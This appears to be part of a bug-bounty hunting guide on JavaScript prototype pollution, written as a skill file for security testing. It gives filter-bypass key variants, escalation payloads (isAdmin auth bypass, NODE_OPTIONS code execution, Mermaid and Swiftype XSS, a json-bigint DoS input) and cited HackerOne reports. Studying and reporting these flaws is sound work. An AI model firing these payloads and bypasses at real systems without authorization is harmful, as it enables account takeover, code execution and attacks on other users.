2. **Attacker-controlled path strings** — path utilities (`dot-prop`, `object-path-set`, `property-expr`, `mpath`, `nested-property`, lodash `set`/`setWith`) let the caller choose the traversal path; a path containing `__proto__` or `constructor.prototype` escapes into the base prototype (#719856, #878332, #910206, #390860).

3. **Config objects merged from untrusted structured input** — Mermaid directives, i18next bundles, JSON Merge Patch documents, VTL templates, and chart options are all merged into trusted defaults with deep-merge logic (#1106238, #968355, #980649, #3897236, #776371).

4. **Cache keyed by attacker value** — `cached-path-relative` used the path string as a plain-object cache key, so `relative('__proto__', 'x')` overwrote the prototype (#390847). The report's own patch advice: "Initialize the cache using Object.create(null) or use the Map data structure."

5. **JSON parsers that assign `__proto__`** — `json-bigint` assigned to `__proto__` during parse, confusing `bignumber.js` and causing DoS on later arithmetic/stringification (#916430).

6. **Perceived-safe deep-clone/defaults operations** — as #454365 notes, using `$.extend` for cloning or filling defaults *"is not at all obvious that this is an unsafe operation"*; developers trust the operation.

7. **Forks that drop upstream guards** — AWS Amplify's `velocityjs` fork never backported prototype-chain guards and resolved raw `baseRef[id]` (#3897236). Variant reports repeatedly show one patched library while clones remain vulnerable.

8. **Pollution treated as "just DoS"** — many reports score low (CVSS 1.8–2.5) because researchers stop at the MAID/DoS symptom; the same primitive escalates to SQLi, XSS, permission bypass, or RCE when a gadget is found. #719856 explicitly says severity "can vary in severity depending on the implementation (DoS, access to sensitive data, RCE)."

---

## Bypass Techniques

### Proto-Key Variants (when `__proto__` is filtered)

```
__proto__                              # canonical
constructor.prototype                  # alternate route to Object.prototype
constructor.prototype.isAdmin          # path-string form (property-expr)
__proto__.b                             # dot-path form (dot-prop, nested-property, mpath)
__proto__[b]                            # bracket form (lodash set/setWith, deparam)
["__proto__"]                          # computed key in source
{"constructor": {"prototype": {...}}}  # nested constructor chain
```

### Parser / Notation Bypasses

- **Bracket vs dot notation** — if the filter strips literal `__proto__` but the parser supports `constructor[prototype][x]` or `__proto__[x]`, use the bracket form (#998398, #864701).
- **Dotted path strings** — path setters accept a single string like `constructor.prototype.isAdmin`; a string-content filter for `__proto__` misses it (#910206).
- **JSON.parse to create the key** — literal object syntax `{__proto__: ...}` sets the prototype but JSON.parse creates an own `__proto__` property that deep-merge routines then copy; every report uses `JSON.parse('{"__proto__":...}')` for this reason.
- **Forks and variants** — if the maintained version is patched, an unmaintained fork/clone may still be vulnerable (#3897236, and the 2018 merge family variants).
- **Alternate gadgets** — if an `isAdmin` gadget is patched, pivot to `NODE_OPTIONS` (child spawn), `template`/`themeCSS` (XSS), or query-builder options (SQLi).

### Escalation Bypasses

- **Auth bypass** — pollute `isAdmin: true`, `isAuthenticated: true`, or `role: 'admin'` and retry a protected route.
- **CSP / sanitizer bypass** — in Mermaid, pollute `template` with an `<iframe srcdoc>` so the injected `<script src=...>` executes even under a restrictive CSP (#1280002 loaded a payload.js from a GitLab CI artifact).
- **Permission-system bypass** — `process.mainModule.__proto__.require()` sidesteps Node's `--experimental-policy` resource checks (#1877919).
- **Environment injection** — `NODE_OPTIONS=--require=...` turns a child-process spawn into code execution (#878181).
- **Method/property override** — overriding `toString` during deep clone was cited as a path to RCE in klona (#778414); overriding numeric/length properties was the DoS path in json-bigint (#916430).

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker DO right now?**
   - Show the pollution actually landed: `({}).<probe> === '<marker>'` or `Object.prototype.<probe>` set (not merely an echoed key).
   - Identify the gadget that consumes it: an auth check flipping, a template rendering attacker HTML, a SQL query changing, a child process executing your `--require` file, or a reproducible crash/hang.
   - "The parser has a `__proto__` key" alone is insufficient — demonstrate the downstream behavior change.
   - For DoS-only findings, show the smallest reliable trigger (e.g., the 70-byte json-bigint payload that hangs on stringify/arithmetic).

2. **What does the victim LOSE?**
   - Auth bypass / privilege escalation (admin access via `isAdmin`)?
   - Stored or DOM XSS affecting other users (GitLab/Swiftype)?
   - SQL injection / data compromise (typeorm)?
   - RCE via child-process or template gadget (#878181, #3897236)?
   - If the only impact is a self-inflicted DoS, say so and score accordingly — most npm-module reports are CVSS 1.8–7.6 DoS/MAID; the few high-impact cases (CVSS 9.3–9.9) have a real gadget.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Is the vulnerable library version/endpoint still present?
   - Does the marker reliably appear on `Object.prototype` across repeated requests?
   - Can a second person send the same JSON/path string and observe the same gadget behavior?
   - For stored XSS, does the payload persist across reloads and affect a different viewer?

### Evidence-to-Severity Matrix

| What you can demonstrate | Reportable? | Representative case |
|---|---|---|
| `{"__proto__":{...}}` accepted; marker lands on `Object.prototype`; no consumer | Yes, as MAID/low | #310443, #878332 |
| Marker lands + reproducible hang/crash from small input | Yes, as DoS | #916430 (70 bytes), #804772 |
| Marker lands + `isAdmin` bypass on a protected route | Yes, medium/high | payload used in #380873, #980649, #801522 |
| Marker lands + attacker HTML/CSS rendered to another user | Yes, stored/DOM XSS | #1106238, #1280002, #998398 |
| Marker lands + query structure changes | Yes, SQLi (critical) | #869574 (CVSS 9.9) |
| Marker lands + child process executes your `--require` file | Yes, RCE | #878181 |
| Raw prototype-chain traversal reaching file operations in a CLI | Yes, RCE | #3897236 |

The negative control belongs in the report: if `constructor.prototype` pollutes but `__proto__` does not (or vice versa), state it — it tells the maintainer which guard to add. Likewise, if a gadget candidate (e.g., `isAdmin`) does *not* change behavior, record that too rather than claiming an unverified bypass.

---

## Real Impact Examples

### Scenario A: Stored XSS via Mermaid Config Pollution (GitLab Pattern — #1106238, #1280002, $3,000 each)

GitLab renders Mermaid diagrams in issues/GFM. Mermaid directives `%%{init: {<JSON_OBJECT>}}%%` let users override theme properties; the library deep-merges that JSON into its config, which then generates CSS. By submitting a directive containing `{'__proto__': {'template': '<iframe ... srcdoc="<script src=payload.js>">'}}`, the researcher polluted the config object's prototype so the `template` property was inherited globally. When a victim clicked the search bar (a UI element that reads the polluted `template` property), the injected iframe/script executed — stored XSS requiring minimal interaction. A second report (#1280002) found an additional vector, polluting `themeCSS`/`fontFamily` paths, again $3,000 (CVSS 8.7).

### Scenario B: PP → SQL Injection (typeorm Pattern — #869574, CVSS 9.9 Critical)

The `typeorm` ORM used a `mergeDeep(target, ...sources)` helper with a recursive `for (const key in source)` loop lacking prototype guards. An attacker able to save a specially crafted object polluted `Object.prototype` and added arbitrary properties to every object in the runtime. Because the ORM's query-building logic reads properties from object instances, the pollution altered generated SQL — turning a "mere" prototype pollution into SQL injection (and DoS). This is the strongest illustration that severity follows the gadget, not the pollution primitive itself.

### Scenario C: PP → Child-Process RCE (NODE_OPTIONS Gadget — #878181)

A prototype pollution in a library (e.g., an untrusted Handlebars template processed via an advisory-1164-style bug) let the attacker set `({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js'`. Because polluted prototype properties are reflected into the environment of `child_process` spawns, the next time the application spawned a Node subprocess, the injected `--require` flag executed arbitrary JavaScript before the subprocess ran — converting PP into reliable RCE.

### Scenario D: DOM XSS from a Same-File Gadget (Swiftype Pattern — #998398)

`st.js` at `s.swiftypecdn.com` used a `deparam` function that parsed `location.hash` into an object without guarding `__proto__`. Visiting `https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)` polluted `Object.prototype.asd`. Crucially, the same JS bundle contained a script gadget that read a configurable property and passed it to an execution sink, so the polluted value became `alert(document.domain)` — DOM XSS on a high-traffic blog with a single crafted URL.

### Scenario E: Tiny PP → DoS (json-bigint Pattern — #916430, CVSS 7.5)

`json-bigint`'s parser assigned to `__proto__` during parse. The 70-byte payload `{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}` produced an object whose subsequent `toString()` or arithmetic hung because `bignumber.js` consumed the polluted numeric/length properties. This is the most common impact tier in the corpus (43/53 reports carry the `dos-resource` signal), and a reminder that even a "small" DoS finding is a valid report when the gadget can't be escalated.

### Scenario F: Permission-System Bypass (Node.js Pattern — #1877919)

Node v19.6.1's `--experimental-policy` restricted which files a process could load. Calling `process.mainModule.require()` respected the policy, but `process.mainModule.__proto__.require()` bypassed the check entirely, allowing arbitrary module loads (`os`, and by extension other modules) despite a policy that permitted only a single file. A prototype-chain traversal converted a security control into a no-op.

---

## Disclosed Report Citations (30 — all IDs verified present in the study pack)

1. **Elastic — Prototype Pollution leads to XSS on blog.swiftype.com via `#__proto__[asd]=alert(document.domain)`** ([H1 #998398](https://hackerone.com/reports/998398)) — DOM XSS, `deparam` location.hash parse + same-file script gadget, 2020 (High, no bounty listed).
   - Payload: `https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)` against `s.swiftypecdn.com/install/v2/st.js`.
   - Root cause: `deparam` splits `location.hash` keys on `][` and assigns `c[u] = ...` without guarding `__proto__`.

2. **GitLab — Stored XSS via Mermaid Prototype Pollution** ([H1 #1106238](https://hackerone.com/reports/1106238)) — stored XSS, Mermaid directive config merge, 2021, $3,000.
   - Payload: `%%{init: {<JSON_OBJECT>}}%%` directive overriding `themeCSS` / `fontFamily`; directives merged into config object used to generate CSS.
   - Root cause: user-provided directive JSON deep-merged into Mermaid config; config properties flow into CSS rules.

3. **GitLab — Stored XSS via Mermaid Prototype Pollution (additional vector)** ([H1 #1280002](https://hackerone.com/reports/1280002)) — stored XSS, `template` property pollution requiring minimal interaction, 2021, $3,000 (CVSS 8.7).
   - Payload: `%%{init: { '__proto__': {'template': '<iframe ... srcdoc="<script src=payload.js>">'}}}%%` in an issue; clicking the search bar triggered execution.
   - Root cause: continued investigation of #1106238 found additional pollution vector via Mermaid directives.

4. **Amazon (AWS Amplify CLI) — RCE via Prototype Chain Traversal in amplify-velocity-template** ([H1 #3897236](https://hackerone.com/reports/3897236)) — RCE, unguarded fork resolving raw `baseRef[id]` in VTL templates, year/bounty not disclosed in report text.
   - Payload: crafted VTL resolver template (`#set($x = {})`, raw property resolution) rendered via `@aws-amplify/amplify-appsync-simulator`; file-write proof at `/tmp/amplify-rce-proof`.
   - Root cause: AWS-published fork of `velocityjs` never backported upstream prototype-chain guards.

5. **Node.js — Child process environment injection via prototype pollution** ([H1 #878181](https://hackerone.com/reports/878181)) — RCE, `NODE_OPTIONS` reflected into child-process environment, 2020 (unscored).
   - Payload: `({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js'` before a `child_process.spawn`.
   - Root cause: polluted prototype properties are copied into the environment of spawned child processes.

6. **Node.js third-party modules (typeorm) — SQL Injection or DoS due to a Prototype Pollution** ([H1 #869574](https://hackerone.com/reports/869574)) — SQLi + DoS, `mergeDeep` recursion, 2020 (Critical, CVSS 9.9).
   - Payload: save a specially crafted object that pollutes `Object.prototype` via `mergeDeep`.
   - Root cause: `mergeDeep` loops `for (const key in source)` and `Object.assign`s without prototype-key guards; side effects include SQLi and DoS.

7. **Node.js third-party modules (json-bigint) — DoS via `__proto__` assignment** ([H1 #916430](https://hackerone.com/reports/916430)) — DoS, `__proto__` assignment confusing bignumber.js (~70-byte input), 2020 (High, CVSS 7.5).
   - Payload: `{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}`.
   - Root cause: parser assigns `__proto__`; stringification/arithmetic on the resulting number hangs.

8. **Node.js third-party modules (cached-path-relative) — Prototype Pollution Vulnerability** ([H1 #390847](https://hackerone.com/reports/390847)) — prototype pollution via attacker-controlled cache key, 2018 (High, CVSS 7.6).
   - Payload: `relative('__proto__', 'x'); console.log({}.x)`.
   - Root cause: cache object keyed by attacker-controlled path; patch advice was `Object.create(null)` or `Map`.

9. **Node.js third-party modules (object-path-set) — Prototype pollution** ([H1 #878332](https://hackerone.com/reports/878332)) — MAID, `setPath('__proto__.polluted')`, 2020 (High).
   - Payload: `setPath({}, '__proto__.polluted', 'yes')`.
   - Root cause: `setPath` writes arbitrary paths including `__proto__` into the base prototype.

10. **nodejs — `__proto__` in `process.mainModule.__proto__.require()` bypasses permission system** ([H1 #1877919](https://hackerone.com/reports/1877919)) — permission bypass, Node v19.6.1 `--experimental-policy` evasion, 2023 (high).
    - Payload: `const os = process.mainModule.__proto__.require("os")`.
    - Root cause: prototype-chain traversal reaches an unguarded `require` path that skips policy checks.

11. **Node.js third-party modules (property-expr) — Prototype pollution** ([H1 #910206](https://hackerone.com/reports/910206)) — MAID, `setter('constructor.prototype.isAdmin')`, 2020 (High, CVSS 7.3).
    - Payload: `expr.setter('constructor.prototype.isAdmin')(obj,true); {}.isAdmin // true`.
    - Root cause: `setter` parses attacker path strings without blocking prototype segments.

12. **Node.js third-party modules (lodash) — Prototype pollution attack** ([H1 #712065](https://hackerone.com/reports/712065)) — DoS/possible RCE, `merge`/`mergeWith`/`defaultsDeep`, 2019 (High, CVSS 7.4).
    - Payload: `_.zipObjectDeep(['__proto__.z'],[123]); z // 123`.
    - Root cause: merge family tricked into adding properties of `Object.prototype`; server crash/DoS guaranteed, RCE possible in some cases.

13. **Node.js — Prototype pollution via console.table properties** ([H1 #1431042](https://hackerone.com/reports/1431042)) — limited MAID, `console.table(obj, ['__proto__'])`, 2021 (Low, CVSS 2.2).
    - Payload: `console.table({foo: 'bar'}, ['__proto__'])` → `Object.prototype[0] === ''`.
    - Root cause: `console.table` formatting logic assigns empty strings to numeric keys of the prototype when the `properties` parameter is attacker-controlled.

14. **Node.js third-party modules (lodash) — Prototype pollution attack (constructor.prototype)** ([H1 #380873](https://hackerone.com/reports/380873)) — DoS, `constructor.prototype` variant, 2018 (High, CVSS 7.0).
    - Payload: `_.merge({}, JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'))`.
    - Root cause: variant of #310443 using the `constructor.prototype` route.

15. **Node.js third-party modules (nested-property) — Prototype Pollution** ([H1 #788883](https://hackerone.com/reports/788883)) — MAID, nested set variant of #719856, 2020 (Medium, CVSS 5.9).
    - Payload: nested-property module set operation on `__proto__.polluted`.
    - Root cause: vulnerable when performing a set operation for nested objects.

16. **Node.js third-party modules (i18next) — Prototype pollution attack** ([H1 #968355](https://hackerone.com/reports/968355)) — MAID, `addResourceBundle`/`deepExtend`, 2020 (High).
    - Payload: translation `{ constructor: { prototype: { polluted: true } } }` via `addResourceBundle(..., true, true)`.
    - Root cause: `deepExtend` merges translation bundles without prototype guards.

17. **Node.js third-party modules (lodash) — Prototype pollution attack** ([H1 #310443](https://hackerone.com/reports/310443)) — DoS, JSON endpoint `{"__proto__":{"oops":"It works !"}}`, 2018 (Low, CVSS 2.5).
    - Payload: `_.merge({}, JSON.parse('{"__proto__":{"oops":"It works !"}}'))` from a JSON endpoint.
    - Root cause: canonical lodash merge pollution; parent of many variant reports (#380873, #381194, #381185, #430291, #430831, #454365).

18. **Node.js third-party modules (fastify-multipart) — Prototype pollution in multipart parsing** ([H1 #804772](https://hackerone.com/reports/804772)) — remote DoS via crafted multipart field names (busboy), 2020 (Critical, CVSS 9.3).
    - Payload: specially crafted multipart request; fixed in v1.0.5.
    - Root cause: parser uses attacker-controlled field names as object keys; Eran Hammer found the analogous Hapi issue first.

19. **Node.js third-party modules (dot-prop) — Prototype pollution in dot-prop** ([H1 #719856](https://hackerone.com/reports/719856)) — MAID, `set(object,'__proto__.b',true)`, 2019 (Medium, CVSS 6.3).
    - Payload: `dotProp.set(object, '__proto__.b', true); {}.b // true`.
    - Root cause: path-based `set` accepts `__proto__` segments; impact varies from DoS to data access to RCE.

20. **Node.js third-party modules (merge) — Prototype pollution attack (merge.recursive)** ([H1 #381194](https://hackerone.com/reports/381194)) — DoS, `merge.recursive({}, {"__proto__":{...}})`, 2018 (Low).
    - Payload: `merge.recursive({}, JSON.parse('{"__proto__": {"isAdmin": true}}'))`.
    - Root cause: variant of #310443 in `merge.recursive`.

21. **Node.js third-party modules (lodash 4.17.15) — Prototype Pollution** ([H1 #864701](https://hackerone.com/reports/864701)) — DoS, `set`/`setWith` with `"__proto__[test]"`, 2020 (High).
    - Payload: `lod.setWith({}, "__proto__[test]", "123"); lod.set({}, "__proto__[test2]", "456")`.
    - Root cause: bracketed literal path bypasses naive filters; variation on #380873.

22. **Node.js third-party modules (jQuery) — Prototype pollution attack through `$.extend`** ([H1 #454365](https://hackerone.com/reports/454365)) — MAID, deep `$.extend(true,...)`, 2018 (Medium, CVSS 5.6).
    - Payload: object with named `__proto__` property, usually via `JSON.parse`, into deep `$.extend`.
    - Root cause: only the deep version of `$.extend` is affected; cloning/defaults usage makes it unsafe without obvious signals.

23. **Node.js third-party modules (klona) — Prototype pollution** ([H1 #778414](https://hackerone.com/reports/778414)) — DoS/possible RCE via overriding `toString` during deep clone, 2020 (Critical, CVSS 9.4).
    - Payload: arbitrary property added to Prototype while deep cloning; fixed in v1.1.1.
    - Root cause: deep-clone routine copies `__proto__` into the prototype; overriding methods like `toString` can lead to RCE.

24. **Node.js third-party modules (mpath) — Prototype Pollution Vulnerability** ([H1 #390860](https://hackerone.com/reports/390860)) — MAID/noSQL mass-assignment, `mpath.set('__proto__.x',...)`, 2018 (High, CVSS 7.6).
    - Payload: `mpath.set('__proto__.x', ['hilarious','fruity'], obj); {}.x`.
    - Root cause: MongoDB-like path notation lets attackers include the prototype object in a path.

25. **Node.js third-party modules (lutils-merge) — Prototype pollution attack** ([H1 #439107](https://hackerone.com/reports/439107)) — DoS, recursive copy with `__proto__` payload, 2018 (Medium).
    - Payload: `merge({}, JSON.parse('{"__proto__":{"polluted":"merge_done !"}}'))`.
    - Root cause: recursive copy of attacker JSON; variant of #438274.

26. **Node.js third-party modules (json8-merge-patch) — Prototype Pollution** ([H1 #980649](https://hackerone.com/reports/980649)) — MAID/possible RCE, `apply` with `{"__proto__":{"isAdmin":true}}`, 2020 (High, CVSS 7.3).
    - Payload: `json8mergepatch.apply(obj, JSON.parse('{ "__proto__": { "isAdmin": true }}'))`.
    - Root cause: RFC 7396 Merge Patch `apply` fails to restrict access to object prototypes.

27. **Node.js third-party modules (extend) — Prototype pollution attack** ([H1 #381185](https://hackerone.com/reports/381185)) — DoS, `extend(true, {}, {"__proto__":...})`, 2018 (Critical, CVSS 9.3).
    - Payload: `extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'))`.
    - Root cause: variant of #310443 in the `extend` package.

28. **Node.js third-party modules (noble) — Prototype Pollution Vulnerability** ([H1 #390857](https://hackerone.com/reports/390857)) — MAID via BLE-controlled method parameters, 2018 (High, CVSS 8.6).
    - Payload: inject arbitrary properties on `Object.prototype` via exposed module methods.
    - Root cause: strong evidence (parameter names) that values can be controlled remotely through Bluetooth.

29. **Node.js third-party modules (utils-extend) — Prototype pollution** ([H1 #801522](https://hackerone.com/reports/801522)) — MAID/DoS/possible RCE, `extend` with `__proto__` payload, 2020 (Critical, CVSS 9.4).
    - Payload: `const payload = '{"__proto__":{"isAdmin":true}}'` into `extend`.
    - Root cause: extend utility modifies the prototype of a base object; severity varies by implementation.

30. **Node.js third-party modules (just-extend) — Prototype pollution attack in just-extend** ([H1 #430291](https://hackerone.com/reports/430291)) — MAID, `constructor.prototype` and `__proto__` variants, 2018 (Medium, CVSS 5.7).
    - Payload: `extend(true, {}, JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'))` and the `__proto__` form.
    - Root cause: variant of #310443; both prototype routes accepted.

---

## Related Skills & Chains

- **`hunt-xss`** — PP's most common web gadget. Chain primitive: pollute `template`/`themeCSS`/`fontFamily` config → stored/DOM XSS (GitLab Mermaid #1106238/#1280002, Swiftype #998398, chart.js #776371).
- **`hunt-authorization` / `hunt-privilege-escalation`** — pollute `isAdmin: true` / `role: 'admin'` on `Object.prototype` to bypass `if (user.isAdmin)` checks. Dozens of reports use the `isAdmin` payload.
- **`hunt-sqli`** — PP in ORM merge helpers mutates query-builder objects → SQL injection (typeorm #869574, CVSS 9.9).
- **`hunt-rce` / `hunt-command-injection`** — PP → `NODE_OPTIONS` child-process environment injection (#878181); PP → VTL prototype-chain traversal in AWS Amplify CLI (#3897236); PP → `toString`/method override (klona #778414).
- **`hunt-deserialization`** — JSON/structured parsers that assign `__proto__` (json-bigint #916430) sit at the PP/deserialization boundary.
- **`js-source-review`** — the primary discovery method (20/53 reports): audit recursive merge/clone/set implementations for missing prototype-key guards. #869574 and the 2018 merge family were all found this way.
- **`security-arsenal`** — load the Prototype Pollution Payload Cheatsheet (`__proto__`, `constructor.prototype`, dotted/bracket paths) and gadget list before testing.
- **`triage-validation`** — Gate 0: a reflected `__proto__` key is not pollution; require `({}).<marker>` confirmation on the prototype plus a demonstrated gadget before submitting.
